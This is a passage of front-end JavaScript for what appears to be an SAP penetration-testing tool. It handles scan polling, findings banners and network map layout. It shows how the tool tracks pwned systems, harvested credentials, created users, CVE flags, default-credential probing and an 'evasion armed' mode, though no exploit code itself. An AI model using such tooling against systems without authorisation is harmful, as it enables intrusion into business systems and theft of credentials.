    scc_probe_default_creds: !!(document.getElementById('adv-scc-probe-creds') && document.getElementById('adv-scc-probe-creds').checked),
  };
  // Keep console history across scans — the operator wants to see prior
  // scan output too.  The backend appends a "New scan: ..." divider so
  // the boundary between scans stays obvious; polling picks up the
  // divider plus all subsequent lines from where the cursor left off.
  // Reset the findings bus (banner + drawer) for the new scan
  findingsCursor = 0;
  _activeFindings = [];
  _dismissedFindingIds = new Set();
  _bannerHiddenIds = new Set();
  renderFindings();
  _maybeAskNotifPermission();
  try { await api('POST', 'findings/clear'); } catch (_) {}
  await api('POST', 'scan/start', config);
  document.getElementById('st-status').textContent = 'Scanning...';
  startPolling();
}

function toggleAdvanced() {
  const adv = document.getElementById('toolbar-adv');
  adv.style.display = adv.style.display === 'none' ? 'flex' : 'none';
}

let consoleMaximized = false;
function maximizeConsole() {
  const container = document.getElementById('console-container');
  const body = document.getElementById('console-body');
  const mapContainer = document.getElementById('map-container');
  const legendBar = document.getElementById('legend-bar');
  if (consoleMaximized) {
    container.style.height = '180px';
    container.style.flex = '';
    body.style.overflow = '';
    mapContainer.style.display = '';
    legendBar.style.display = '';
    consoleMaximized = false;
  } else {
    container.style.height = '';
    container.style.flex = '1 1 auto';
    body.style.overflow = 'auto';
    mapContainer.style.display = 'none';
    legendBar.style.display = 'none';
    consoleMaximized = true;
  }
}

async function stopScan() {
  const r = await api('POST', 'scan/stop');
  const bt = (r && r.betrusted_cancelled) || 0;
  document.getElementById('st-status').textContent =
    bt ? `Cancelled (+${bt} 10KBlaze)` : 'Cancelled';
}

// --- Polling ---
function startPolling() {
  if (pollTimer) return;
  pollTimer = setInterval(pollUpdates, 800);
}

function stopPolling() {
  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
}

async function pollUpdates() {
  try {
    // Poll console
    const consoleData = await api('GET', 'console?cursor=' + consoleCursor);
    if (consoleData.lines && consoleData.lines.length > 0) {
      const body = document.getElementById('console-body');
      for (const line of consoleData.lines) {
        const div = document.createElement('div');
        div.className = line.cls || 'cl-info';
        div.innerHTML = '<span style="color:#484f58">' + line.ts + '</span> ' + line.text;
        body.appendChild(div);
        // Detect [ACTION_NEEDED] tags — the backend uses these when
        // it hits a state the operator must resolve manually (e.g.
        // pre-existing user whose password can't be reset to
        // productive via RFC).  Surface as a sticky toast so it
        // doesn't get buried in console scroll.
        const t = (line.text || '');
        const mAct = t.match(/\[ACTION_NEEDED\]\s*(.*)$/);
        if (mAct) {
          showToast(
            '<div style="display:flex;justify-content:space-between;'
              + 'align-items:center;margin-bottom:6px">'
              + '<strong style="color:#d29922">&#9888; Operator '
                + 'action needed</strong>'
              + '<span data-close style="cursor:pointer;color:#8b949e;'
                + 'font-size:14px;margin-left:12px" title="dismiss">&times;</span>'
            + '</div>'
            + '<div style="color:#c9d1d9;line-height:1.45">'
              + mAct[1]
            + '</div>'
            + '<div style="margin-top:8px;text-align:right">'
              + '<button class="btn" style="padding:3px 10px;'
                + 'font-size:11px" data-close>Dismiss</button>'
            + '</div>',
            {stickUntilClose: true}
          );
          // Also recolour the console line so the context around
          // the toast stays easy to find on scroll-back.
          div.style.borderLeft = '3px solid #d29922';
          div.style.paddingLeft = '6px';
        }
      }
      body.scrollTop = body.scrollHeight;
      consoleCursor = consoleData.cursor;
    }

    // Poll findings (critical-finding banner + drawer)
    try {
      const fd = await api('GET', 'findings?cursor=' + findingsCursor);
      if (fd && Array.isArray(fd.findings) && fd.findings.length > 0) {
        for (const rec of fd.findings) {
          _activeFindings.push(rec);
          // Auto-dismiss banner rows after 5 s — the drawer + console
          // keep the full history, so no information is lost.
          if (rec.severity === 'CRITICAL' || rec.severity === 'HIGH'
              || rec.severity === 'INFO') {
            // INFO auto-dismisses in both banner AND badge (noisy scan
            // events shouldn't leave a long-lived badge trail).
            setTimeout((id, sev) => {
              _bannerHiddenIds.add(id);
              if (sev === 'INFO') _dismissedFindingIds.add(id);
              renderFindings();
              try { updateMap(); } catch (_) {}
            }, 5000, rec.id, rec.severity);
          }
          // Desktop notification for CRITICAL when the window isn't
          // focused — operators who left the tab open during a long
          // exploit chain get a native OS pop when something pwns.
          if (rec.severity === 'CRITICAL') _maybeNotifyDesktop(rec);
          // Map pulse — light up the affected node (and, for findings
          // that carry a source/target pair in meta, the connection too).
          // Deferred one tick so the node's _x/_y is guaranteed to be set
          // by an in-flight updateMap() for a just-plotted system.
          setTimeout(() => { try { _maybePulseFromFinding(rec); } catch (_) {} }, 50);
        }
        findingsCursor = fd.cursor || findingsCursor;
        renderFindings();
        try { updateMap(); } catch (_) {}
        // Issue #2 (item 3) — if the per-node Findings panel is open
        // and any of the new records belong to that SID, re-render
        // the panel so its content stays live.  Gated by data-view so
        // we don't fight another panel that reused #detail-panel.
        try {
          const panel = document.getElementById('detail-panel');
          const openSid = _openFindingsPanelSid;
          if (openSid && panel && panel.classList.contains('visible')
              && panel.getAttribute('data-view') === 'findings'
              && panel.getAttribute('data-sid') === openSid) {
            const hasNewForSid = fd.findings.some(r => r.node === openSid);
            if (hasNewForSid) showFindings(openSid);
          }
        } catch (_) {}
      }
    } catch (_) { /* findings polling never blocks state refresh */ }

    // Poll state
    const state = await api('GET', 'state');
    if (state) {
      // Preserve dragged node positions across state refreshes
      const oldNodes = mapState.nodes || {};
      for (const sid in state.nodes || {}) {
        if (oldNodes[sid] && oldNodes[sid]._x != null) {
          state.nodes[sid]._x = oldNodes[sid]._x;
          state.nodes[sid]._y = oldNodes[sid]._y;
        }
      }
      const oldScc = mapState.scc_nodes || {};
      for (const h in state.scc_nodes || {}) {
        if (oldScc[h] && oldScc[h]._x != null) {
          state.scc_nodes[h]._x = oldScc[h]._x;
          state.scc_nodes[h]._y = oldScc[h]._y;
        }
      }
      const oldBtp = mapState.btp_subaccounts || {};
      for (const u in state.btp_subaccounts || {}) {
        if (oldBtp[u] && oldBtp[u]._x != null) {
          state.btp_subaccounts[u]._x = oldBtp[u]._x;
          state.btp_subaccounts[u]._y = oldBtp[u]._y;
        }
      }
      // Issue #2 (item 3) — detect a growth in the open panel's
      // persistent findings (arriving via state, not the findings
      // bus) BEFORE mapState is replaced.  Persistent findings show
      // up when a scan finalises node.findings on the server side.
      let _findingsPanelNeedsRefresh = false;
      try {
        const openSid = _openFindingsPanelSid;
        const panel = document.getElementById('detail-panel');
        if (openSid && panel && panel.classList.contains('visible')
            && panel.getAttribute('data-view') === 'findings'
            && panel.getAttribute('data-sid') === openSid) {
          const oldN = (mapState.nodes || {})[openSid];
          const newN = (state.nodes || {})[openSid];
          const oldLen = oldN && oldN.findings ? oldN.findings.length : 0;
          const newLen = newN && newN.findings ? newN.findings.length : 0;
          if (newLen > oldLen) _findingsPanelNeedsRefresh = true;
        }
      } catch (_) {}
      // Details-panel live refresh — detect whether the currently open
      // system/SCC/BTP details panel points at a node whose data changed
      // in this poll (e.g. GW vuln flipped to YES mid-scan) and mark for
      // re-render.  JSON-stringify diff avoids clobbering hover / copy
      // interactions when nothing changed.  Gated by data-view so we
      // don't fight the findings-panel refresh above or any other view
      // that shares #detail-panel.
      let _detailsPanelNeedsRefresh = false;
      let _detailsRefreshKind = null;
      let _detailsRefreshKey = null;
      try {
        const panel = document.getElementById('detail-panel');
        if (panel && panel.classList.contains('visible')) {
          const view = panel.getAttribute('data-view');
          const dsid = panel.dataset.sid || '';
          if (view === 'details' && dsid) {
            const oldN = (mapState.nodes || {})[dsid];
            const newN = (state.nodes || {})[dsid];
            if (newN && JSON.stringify(oldN) !== JSON.stringify(newN)) {
              _detailsPanelNeedsRefresh = true;
              _detailsRefreshKind = 'details';
              _detailsRefreshKey = dsid;
            }
          } else if (view === 'scc' && dsid.indexOf('scc:') === 0) {
            const host = dsid.slice(4);
            const oldS = (mapState.scc_nodes || {})[host];
            const newS = (state.scc_nodes || {})[host];
            if (newS && JSON.stringify(oldS) !== JSON.stringify(newS)) {
              _detailsPanelNeedsRefresh = true;
              _detailsRefreshKind = 'scc';
              _detailsRefreshKey = host;
            }
          } else if (view === 'btp' && dsid.indexOf('btp:') === 0) {
            const uuid = dsid.slice(4);
            const oldB = (mapState.btp_subaccounts || {})[uuid];
            const newB = (state.btp_subaccounts || {})[uuid];
            if (newB && JSON.stringify(oldB) !== JSON.stringify(newB)) {
              _detailsPanelNeedsRefresh = true;
              _detailsRefreshKind = 'btp';
              _detailsRefreshKey = uuid;
            }
          } else if (view === 'tms' && dsid.indexOf('tms:') === 0) {
            // dsid: tms:<srcSid>:<target>:<domain>
            const parts = dsid.split(':');
            if (parts.length >= 4) {
              const [_p, srcSid, target, domain] = parts;
              const src = ((mapState.nodes || {})[srcSid] || {});
              const src2 = ((state.nodes || {})[srcSid] || {});
              const oldD = (src.tms_destinations || []).find(
                d => d.target_sid === target && d.domain === domain);
              const newD = (src2.tms_destinations || []).find(
                d => d.target_sid === target && d.domain === domain);
              if (newD && JSON.stringify(oldD) !== JSON.stringify(newD)) {
                _detailsPanelNeedsRefresh = true;
                _detailsRefreshKind = 'tms';
                _detailsRefreshKey = { srcSid, target, domain };
              }
            }
          } else if (view === 'dbcon' && dsid.indexOf('dbcon:') === 0) {
            // dsid: dbcon:<srcSid>:<con_name>
            const rest = dsid.slice(6);
            const colonIdx = rest.indexOf(':');
            if (colonIdx > 0) {
              const srcSid = rest.slice(0, colonIdx);
              const conName = rest.slice(colonIdx + 1);
              const oldEdge = ((mapState.nodes || {})[srcSid] || {})
                .dbcon_edges || [];
              const newEdge = ((state.nodes || {})[srcSid] || {})
                .dbcon_edges || [];
              const oldE = oldEdge.find(x => x.con_name === conName);
              const newE = newEdge.find(x => x.con_name === conName);
              if (newE && JSON.stringify(oldE) !== JSON.stringify(newE)) {
                _detailsPanelNeedsRefresh = true;
                _detailsRefreshKind = 'dbcon';
                _detailsRefreshKey = { srcSid, conName };
              }
            }
          }
        }
      } catch (_) { /* details refresh never blocks state update */ }
      mapState = state;
      activeTasks = state.active_tasks || {};
      updateMap();
      if (_detailsPanelNeedsRefresh) {
        try {
          if (_detailsRefreshKind === 'details') {
            showDetails(_detailsRefreshKey, {refresh: true});
          } else if (_detailsRefreshKind === 'scc') {
            showSCCDetail(_detailsRefreshKey, {refresh: true});
          } else if (_detailsRefreshKind === 'btp') {
            showBTPDetail(_detailsRefreshKey, {refresh: true});
          } else if (_detailsRefreshKind === 'dbcon') {
            showDBCONDetail(_detailsRefreshKey.srcSid,
                             _detailsRefreshKey.conName,
                             {refresh: true});
          } else if (_detailsRefreshKind === 'tms') {
            showTMSDetail(_detailsRefreshKey.srcSid,
                            _detailsRefreshKey.target,
                            _detailsRefreshKey.domain,
                            {refresh: true});
          }
        } catch (_) {}
      }
      if (_findingsPanelNeedsRefresh) {
        try { showFindings(_openFindingsPanelSid); } catch (_) {}
      }
      updateStatusBar();
      updateActivityBar();
      // Tier 3 armed-mode bar — visible while state.evasion.allow_evasion
      // is true.  Driven entirely from server-side state so a stale
      // browser tab can't fake the armed visual.
      try {
        const armed = !!(state.evasion && state.evasion.allow_evasion);
        const bar = document.getElementById('evasion-armed-bar');
        if (bar) bar.style.display = armed ? 'flex' : 'none';
      } catch (_) {}
      if (state.scan_state === 'complete' || state.scan_state === 'error' ||
          state.scan_state === 'cancelled') {
        document.getElementById('st-status').textContent =
          state.scan_state.charAt(0).toUpperCase() + state.scan_state.slice(1);
      }
      // Issue #2 (item 1) — fire ONE toast when the scan state
      // transitions from `running` to a terminal state.  Operators
      // focused on the console don't otherwise get a clear signal
      // that the scan finished.  Guard with a module-level "last
      // seen" so we don't re-fire on every poll cycle.
      const _terminal = state.scan_state === 'complete'
                      || state.scan_state === 'error'
                      || state.scan_state === 'cancelled';
      if (_terminal && window._lastScanState === 'running') {
        // Match the backend banner: total = SAP + SCC + BTP.  Toast
        // was previously undercounting when a scan only found a
        // Cloud Connector or a BTP subaccount.
        const sapCount = Object.keys(state.nodes || {}).length;
        const sccCount = Object.keys(state.scc_nodes || {}).length;
        const btpCount = Object.keys(state.btp_subaccounts || {}).length;
        const totalNodes = sapCount + sccCount + btpCount;
        let vulnCount = 0;
        for (const sid in (state.nodes || {})) {
          const n = state.nodes[sid];
          if (n.gw_vulnerable || n.ms_betrusted_vulnerable
              || n.cve_31324_vulnerable || n.cve_6287_vulnerable
              || n.cve_22536_vulnerable) vulnCount++;
        }
        const label = state.scan_state === 'complete' ? 'Scan complete'
                    : state.scan_state === 'cancelled' ? 'Scan cancelled'
                    : 'Scan aborted';
        const kind = state.scan_state === 'complete' ? 'success'
                    : state.scan_state === 'cancelled' ? 'warn' : 'error';
        const msg = `${label} — ${totalNodes} system${totalNodes===1?'':'s'}`
                  + (vulnCount ? `, ${vulnCount} vulnerable` : '');
        try { showToast(msg, kind); } catch(_) {}
      }
      window._lastScanState = state.scan_state;
    }

    // Poll UI commands (from script runner)
    try {
      const cmds = await api('GET', 'ui/commands');
      if (cmds && cmds.length) {
        for (const c of cmds) {
          if (c.cmd === 'show_impact') showImpactDetail(c.sid);
          else if (c.cmd === 'show_chains') { const r = await fetch('/api/chains'); const d = await r.json(); showChainResults(d.chains || []); }
          else if (c.cmd === 'show_detail') showSystemDetail(c.sid);
          else if (c.cmd === 'highlight_chain') highlightChain(c.path_sids);
          else if (c.cmd === 'relayout') {
            const m = (c.mode || '').toLowerCase();
            if      (m === 'circle')     layoutCircle();
            else if (m === 'star')       layoutStar();
            else if (m === 'hierarchy')  layoutHierarchy();
            else if (m === 'stack'
                  || m === 'by_stack')   layoutByStack();
            else if (m === 'reset')      resetLayout();
            else console.warn('relayout: unknown mode', c.mode);
          }
          else if (c.cmd === 'flash_activity') {
            flashActivity(c.label || 'Working', c.hold_ms);
          }
        }
      }
    } catch(e2) {}
  } catch (e) {
    // Server not responding
  }
}

// Default SAP-shipped Type-G destinations to AWS (ec2 / s3) — the
// standard S/4 install ships two of these with no stored credentials
// and they clutter the map on every landscape.  Hide unless someone
// has actually populated them with a user + secstore password (in
// which case they're real lateral targets and belong on the map).
function _isBareAwsDefaultHost(host) {
  return /^(ec2|s3)([.-][a-z0-9.-]+)?\.amazonaws\.com$/i.test(host || '');
}
function _isBareAwsDefaultDest(c) {
  if (!c) return false;
  if ((c.conn_type || '') !== 'http') return false;
  let host = (c.target_host || '').toLowerCase();
  if (!host && c.http_url) {
    try { host = new URL(c.http_url).hostname.toLowerCase(); }
    catch(_) {}
  }
  if (!_isBareAwsDefaultHost(host)) return false;
  const hasCreds = !!(c.rfc_user
                      && (c.secstore_password || c.password));
  return !hasCreds;
}
// Companion filter: the auto-materialised placeholder SAP node created
// when we first discover one of these Type-G defaults.  Hide when the
// node is nothing more than a hostname pointing at ec2/s3.amazonaws.com
// with no enrichment (no creds, no pwn, no vulns, no findings).  Any
// real interaction lights up one of those flags and the node reappears.
// The placeholder synthesises a fake Inst 00 record so we don't gate on
// (n.instances||[]).length — check ports/services on the instance
// instead, which stay empty until a real scan lands data on it.
function _isBareAwsDefaultNode(n) {
  if (!n) return false;
  const host = (n.hostname || '').toLowerCase();
  const ip = (n.ip || '').toLowerCase();
  if (!_isBareAwsDefaultHost(host) && !_isBareAwsDefaultHost(ip))
    return false;
  const anyRealPort = (n.instances || []).some(i =>
    i && Object.keys(i.ports || {}).length > 0);
  const hasEnrichment = !!(n.pwned
    || (n.credentials || []).length
    || (n.created_users || []).length
    || (n.findings || []).length
    || n.gw_vulnerable || n.ms_vulnerable
    || n.cve_2025_31324_vulnerable || n.cve_2020_6287_vulnerable
    || n.cve_2022_22536_vulnerable
    || anyRealPort);
  return !hasEnrichment;
}

// --- Map rendering ---
function updateMap() {
  // Filter out SAP-shipped ec2/s3 defaults from both nodes AND
  // connections so we don't render orphaned placeholder boxes.
  const _allNodes = mapState.nodes || {};
  const nodes = {};
  for (const sid in _allNodes) {
    if (!_isBareAwsDefaultNode(_allNodes[sid])) nodes[sid] = _allNodes[sid];
  }
  const conns = (mapState.connections || [])
    .filter(c => !_isBareAwsDefaultDest(c))
    // Also drop edges that terminate on a node we just hid, so a
    // surviving edge doesn't render into empty space.
    .filter(c => !c.target_sid || nodes[c.target_sid]
                  || !_allNodes[c.target_sid]);
  const nodeKeys = Object.keys(nodes);
  const _sccCount = Object.keys(mapState.scc_nodes || {}).length;
  const _btpCount = Object.keys(mapState.btp_subaccounts || {}).length;

  if (nodeKeys.length === 0 && _sccCount === 0 && _btpCount === 0) {
    const _msg = document.getElementById('empty-msg');
    // Swap the "start a scan" prompt for live-progress text once a
    // scan is actually running — covers both the toolbar Scan
    // button and the script-runner-driven `scan` action.
    const _scanState = (mapState.scan_state || '').toLowerCase();
    if (_scanState === 'running') {
      _msg.textContent = 'A scan has started — discovered systems '
                          + 'will appear here as soon as they are '
                          + 'fingerprinted…';
    } else if (_scanState === 'cancelled') {
      _msg.textContent = 'Scan cancelled — no systems were '
                          + 'discovered.  Start another scan or load '
                          + 'a saved state.';
    } else if (_scanState === 'error') {
      _msg.textContent = 'Scan errored — check the console output. '
                          + 'Start another scan or load a saved state.';
    } else {
      _msg.textContent = 'Start a scan or load a saved state — or right-click '
                          + 'the canvas / use the Actions menu for more options.';
    }
    _msg.style.display = 'block';
    document.getElementById('legend-bar').style.display = 'none';
    document.getElementById('map-svg').innerHTML = '';
    // Issue #2 (item 5) — show the welcome card on empty landscape
    // unless the operator already dismissed it.  Only when the scan
    // isn't running so we don't overlay the live-progress hint.
    try {
      const dismissed = localStorage.getItem('sapmap.welcome.dismissed') === '1';
      const card = document.getElementById('welcome-card');
      if (card) {
        card.style.display = (!dismissed && _scanState !== 'running')
                              ? 'block' : 'none';
      }
    } catch (_) {}
    return;
  }
  document.getElementById('empty-msg').style.display = 'none';
  document.getElementById('legend-bar').style.display = 'flex';
  // Card is only for the empty-canvas state.
  try {
    const _card = document.getElementById('welcome-card');
    if (_card) _card.style.display = 'none';
  } catch (_) {}

  const svg = document.getElementById('map-svg');
  const BOX_W = 240, BOX_H = 174, MARGIN = 60;
  const cols = Math.max(1, Math.min(4, nodeKeys.length));

  // Auto-layout: zone-aware placement
  // ------------------------------------------------------------------
  // Nodes that share an IP (co-located on the same host) are placed in
  // the same vertical column so their hosting-zone box doesn't overlap
  // with other zones.  "Lone" nodes (unique IPs) each get their own
  // column.  SCC nodes for the same IP share the column with their SAP
  // siblings.
  //
  // Already-positioned nodes (n._x != null) are left untouched — the
  // user may have manually arranged them.  Only fresh nodes get laid out.
  // ------------------------------------------------------------------
  const sccNodes = mapState.scc_nodes || {};
  const sccKeys = Object.keys(sccNodes);
  const btpNodes = mapState.btp_subaccounts || {};
  const btpKeys = Object.keys(btpNodes);

  // Cloud-tier reservation: BTP subaccounts live in a strip above
  // the on-prem layer.  When at least one BTP node exists, on-prem
  // zone layouts start one row + gap further down so the cloud tier
  // has breathing room.
  const TOP_TIER_H = btpKeys.length > 0 ? (BOX_H + MARGIN * 2) : 0;

  const IP_RE_LO = /^\d{1,3}(\.\d{1,3}){3}$/;
  const getIP = n => {
    if (n.ip && IP_RE_LO.test(n.ip)) return n.ip;
    if (n.hostname && IP_RE_LO.test(n.hostname)) return n.hostname;
    if (n.host && IP_RE_LO.test(n.host)) return n.host;
    return null;
  };

  // Build zone groups: ip → [ {kind:'sap'|'scc', id, obj} ]
  const zoneGroups = {};   // ip  → array of members
  const noIPGroup  = [];   // nodes/sccs with no known IP
  nodeKeys.forEach(sid => {
    const ip = getIP(nodes[sid]);
    if (ip) { (zoneGroups[ip] = zoneGroups[ip] || []).push({kind:'sap', id:sid, obj:nodes[sid]}); }
    else noIPGroup.push({kind:'sap', id:sid, obj:nodes[sid]});
  });
  sccKeys.forEach(host => {
    const ip = getIP(sccNodes[host]);
    if (ip) { (zoneGroups[ip] = zoneGroups[ip] || []).push({kind:'scc', id:host, obj:sccNodes[host]}); }
    else noIPGroup.push({kind:'scc', id:host, obj:sccNodes[host]});
  });

  // Separate zones that are fully-placed (all members have _x) from
  // those that need layout work.
  const allGroups = [...Object.values(zoneGroups), ...(noIPGroup.length ? [noIPGroup] : [])];

  // Determine the rightmost X already occupied by any placed node so
  // we can park new zones to its right without overlapping.
  let cursorX = MARGIN;
  allGroups.forEach(members => {
    members.forEach(({obj}) => {
      if (obj._x != null) cursorX = Math.max(cursorX, obj._x + BOX_W + MARGIN * 2);
    });
  });

  // Zone column width: up to 2 SAP-box widths side by side (SAP+SCC pair
  // or lone SAP) plus a gap between zones.
  const ZONE_GAP   = MARGIN * 2;   // horizontal gap between zones
  const COL_STRIDE = BOX_W + MARGIN;

  allGroups.forEach(members => {
    // Skip groups that are already fully placed
    const needsPlace = members.filter(m => m.obj._x == null);
    if (!needsPlace.length) return;

    // Find leftmost X of already-placed members in this group (so new
    // members in the same zone land near their siblings).
    let zoneX = null;
    members.forEach(({obj}) => {
      if (obj._x != null) zoneX = (zoneX == null) ? obj._x : Math.min(zoneX, obj._x);
    });
    if (zoneX == null) {
      zoneX = cursorX;
    }

    // Stack unplaced members in a single column, top-to-bottom.
    // Find the lowest Y already occupied in this zone.  When BTP nodes
    // exist they take the top tier; on-prem zones start below it.
    let zoneY = MARGIN + TOP_TIER_H;
    members.forEach(({obj}) => {
      if (obj._x != null) zoneY = Math.max(zoneY, obj._y + BOX_H + MARGIN);
    });

    needsPlace.forEach(({obj}) => {
      obj._x = zoneX;
      obj._y = zoneY;
      zoneY += BOX_H + MARGIN;
    });

    // Advance the global cursor past this zone for the next group
    cursorX = Math.max(cursorX, zoneX + BOX_W + ZONE_GAP);
  });

  // BTP cloud tier: place subaccount nodes in a horizontal strip at
  // the top of the canvas.  Manually-positioned nodes are left alone.
  // When on-prem nodes already occupy the top row (e.g. they were
  // dragged there or laid out before any BTP node existed), shift
  // the new BTP node past their rightmost edge so it doesn't land
  // ON TOP of S4H — operator's exact symptom after a harvest+mint
  // round.
  if (btpKeys.length > 0) {
    let btpX = MARGIN;
    // Anchor past every already-positioned node that overlaps the
    // BTP-tier vertical band [MARGIN, MARGIN + BOX_H].
    const _topBandHi = MARGIN + BOX_H;
    Object.values(nodes).forEach(n => {
      if (n._x != null && n._y != null
          && n._y < _topBandHi && n._y + BOX_H > MARGIN) {
        btpX = Math.max(btpX, n._x + BOX_W + MARGIN);
      }
    });
    Object.values(sccNodes).forEach(sn => {
      if (sn._x != null && sn._y != null
          && sn._y < _topBandHi && sn._y + BOX_H > MARGIN) {
        btpX = Math.max(btpX, sn._x + BOX_W + MARGIN);
      }
    });
    // Also stack BTP nodes that already have positions
    btpKeys.forEach(uuid => {
      const bn = btpNodes[uuid];
      if (bn._x != null) {
        btpX = Math.max(btpX, bn._x + BOX_W + MARGIN);
      }
    });
    // And DBCON cylinders — otherwise a freshly-materialised BTP
    // node can land right on top of an existing cylinder.
    for (const pk in dbconPositions) {
      const p = dbconPositions[pk];
      if (p._y != null && p._y < _topBandHi && p._y + BOX_H > MARGIN) {
        btpX = Math.max(btpX, p._x + 150 + MARGIN);
      }
    }
    btpKeys.forEach(uuid => {
      const bn = btpNodes[uuid];
      if (bn._x == null) {
        bn._x = btpX;
        bn._y = MARGIN;
        btpX += BOX_W + MARGIN;
      }
    });
  }

  // Compute content bounds (needed for initial auto-fit and fitMap)
  let maxX = 0, maxY = 0;
  nodeKeys.forEach(sid => {
    const n = nodes[sid];
    maxX = Math.max(maxX, (n._x || 0) + BOX_W + MARGIN);
    maxY = Math.max(maxY, (n._y || 0) + BOX_H + MARGIN);
  });
  sccKeys.forEach(host => {
    const sn = sccNodes[host];
    maxX = Math.max(maxX, (sn._x || 0) + BOX_W + MARGIN);
    maxY = Math.max(maxY, (sn._y || 0) + BOX_H + MARGIN);
  });
  btpKeys.forEach(uuid => {
    const bn = btpNodes[uuid];
    maxX = Math.max(maxX, (bn._x || 0) + BOX_W + MARGIN);
    maxY = Math.max(maxY, (bn._y || 0) + BOX_H + MARGIN);
  });

  let html = '';

  // Collect unknown targets when checkbox is on
  const showUnknown = document.getElementById('show-unknown') && document.getElementById('show-unknown').checked;
  const unknownTargets = {};  // host -> { _x, _y, label }
  if (showUnknown) {
    let unkIdx = 0;
    conns.forEach(conn => {
      const srcNode = nodes[conn.source_sid];
      const tgtNode = nodes[conn.target_sid];
      if (srcNode && !tgtNode) {
        const key = conn.target_host || conn.target_sid || ('unk_' + unkIdx++);
        if (!unknownTargets[key]) {
          unknownTargets[key] = {
            label: conn.target_host || conn.target_sid || '?',
            _x: null, _y: null,
          };
        }
      }
    });
    // Position unknown target nodes to the right of the known nodes
    let unkCol = 0;
    const unkStartX = maxX + MARGIN;
    for (const key in unknownTargets) {
      const ut = unknownTargets[key];
      if (unkPositions[key]) {
        ut._x = unkPositions[key]._x;
        ut._y = unkPositions[key]._y;
      } else {
        ut._x = unkStartX;
        ut._y = MARGIN + unkCol * (BOX_H + MARGIN);
        unkPositions[key] = { _x: ut._x, _y: ut._y };
      }
      unkCol++;
    }
    // Update bounds for viewBox
    for (const key in unknownTargets) {
      maxX = Math.max(maxX, unknownTargets[key]._x + BOX_W + MARGIN);
      maxY = Math.max(maxY, unknownTargets[key]._y + BOX_H + MARGIN);
    }
  }

  // Set viewBox (after unknown targets are positioned so bounds include them)
  if (!viewBoxUserControlled || viewBox._nodeCount !== nodeKeys.length) {
    viewBox.w = Math.max(maxX, 800);
    viewBox.h = Math.max(maxY, 600);
    viewBox._nodeCount = nodeKeys.length;
  }
  svg.setAttribute('viewBox', `${viewBox.x} ${viewBox.y} ${viewBox.w} ${viewBox.h}`);

  // Count connections per source→target pair for curve offsets.
  //
  // Normalise BTP-sentinel sids ("BTP:<uuid8>") to the actual BTP
  // subaccount uuid before pairing, so synthetic BTP→on-prem edges
  // (source_sid="BTP:<uuid8>", from link_destinations_to_onprem) and
  // real on-prem→BTP edges (target_sid=<real_uuid>) fall into the
  // SAME pair bucket instead of two separate groups.  Without this
  // normalisation each half thinks it's small-N and applies minimal
  // curve/label spread, and the two clusters overlap in the middle.
  const btpNodesLocal = mapState.btp_subaccounts || {};
  const _canonicalNodeKey = (sid) => {
    if (!sid) return '';
    if (sid.startsWith('BTP:')) {
      const suffix = sid.slice(4);
      for (const u in btpNodesLocal) {
        if (u.startsWith(suffix)) return u;
      }
    }
    return sid;
  };
  const _pairKey = (conn) => {
    const a = _canonicalNodeKey(conn.source_sid || '');
    const b = _canonicalNodeKey(conn.target_sid || conn.target_host || '');
    return a < b ? a + '|' + b : b + '|' + a;
  };
  const pairCount = {};
  const pairIdx = {};
  conns.forEach((conn, ci) => {
    const pairKey = _pairKey(conn);
    pairCount[pairKey] = (pairCount[pairKey] || 0) + 1;
  });
  // Assign index within each pair
  const pairCurrent = {};
  conns.forEach((conn, ci) => {
    const pairKey = _pairKey(conn);
    pairCurrent[pairKey] = (pairCurrent[pairKey] || 0);
    pairIdx[ci] = pairCurrent[pairKey];
    pairCurrent[pairKey]++;
  });

  // Snapshot previous state for animation detection
  const prevNodes = new Set(knownNodeSids);
  const prevConns = new Set(knownConnKeys);

  // ── Hosting-zone background boxes ───────────────────────────────────────
  // Group every node (SAP + SCC) by its canonical host key.  Nodes that
  // share a host (matched on IP first, then on hostname) are co-located
  // on the same physical host and get a common background zone drawn
  // behind them.
  //
  // Prior implementation required IPv4 match — TWP + SCC nodes reached
  // via hostname (e.g. "twtestenv2") both had ``ip = "twtestenv2"``
  // (a hostname, not an IP), so the IPv4 regex rejected them and the
  // zone never formed.  Now: prefer IP if numeric, else fall back to
  // hostname/host — hostnames are equally valid host keys as long as
  // they match across the co-located nodes.
  {
    const IP_RE = /^\d{1,3}(\.\d{1,3}){3}$/;
    // Canonical host key for a node — IPv4 if we have one, else a
    // lowercased hostname (matches SCC's `host` field, which is
    // usually just the hostname).  Empty string means "can't group".
    const hostKey = obj => {
      const cand = [obj.ip, obj.hostname, obj.host]
        .map(s => (s || "").trim())
        .filter(Boolean);
      // Prefer IPv4 to avoid short/long-name mismatches for the same
      // host (e.g. "twp" vs "twp.corp.local").
      for (const c of cand) if (IP_RE.test(c)) return c;
      // Fall back to first non-empty non-IP string, lowercased.
      return (cand[0] || "").toLowerCase();
    };
    // key -> [ {x, y, w, h, label, nodeType} ]
    const zoneMap = {};
    const addToZone = (key, x, y, w, h, label, nodeType) => {
      if (!key) return;
      if (x == null || y == null) return;
      if (!zoneMap[key]) zoneMap[key] = [];
      zoneMap[key].push({ x, y, w, h, label, nodeType });
    };

    // DBCON cylinders + TMS trucks live in their source SAP node's
    // host cluster (they're that source's outbound accessories), so
    // the physical-host zone box should visually wrap them too.
    // Without this the zone hugs the SAP boxes and the cylinders /
    // truck stick out to the right and below, looking orphaned.
    // Constants match the DBCON / TMS drawing loops further down —
    // if those get resized, update these too.
    const _DB_ACCESSORY_W = 150, _DB_ACCESSORY_H = 100;
    const _TMS_ACCESSORY_W = 160, _TMS_ACCESSORY_H = 100;

    Object.entries(nodes).forEach(([sid, n]) => {
      const k = hostKey(n);
      addToZone(k, n._x, n._y, BOX_W, BOX_H, sid, 'sap');
      // DBCON accessories — persisted positions from prior render.
      // First render for a new node has no persisted pos yet, so
      // the zone excludes it; next render picks it up (positions
      // are computed + persisted during the DBCON drawing loop
      // further down in this render, and the next poll re-enters
      // this block).
      for (const edge of (n.dbcon_edges || [])) {
        const pk = sid + '|' + edge.con_name;
        const p = dbconPositions[pk];
        if (p) addToZone(k, p._x, p._y,
                          _DB_ACCESSORY_W, _DB_ACCESSORY_H,
                          `dbcon:${edge.con_name}`, 'dbcon');
      }
      // TMS trucks — same story.
      for (const dest of (n.tms_destinations || [])) {
        const pk = 'tms:' + sid + '|' + dest.target_sid + '|' + dest.domain;
        const p = tmsPositions[pk];
        if (p) addToZone(k, p._x, p._y,
                          _TMS_ACCESSORY_W, _TMS_ACCESSORY_H,
                          `tms:${dest.target_sid}`, 'tms');
      }
    });
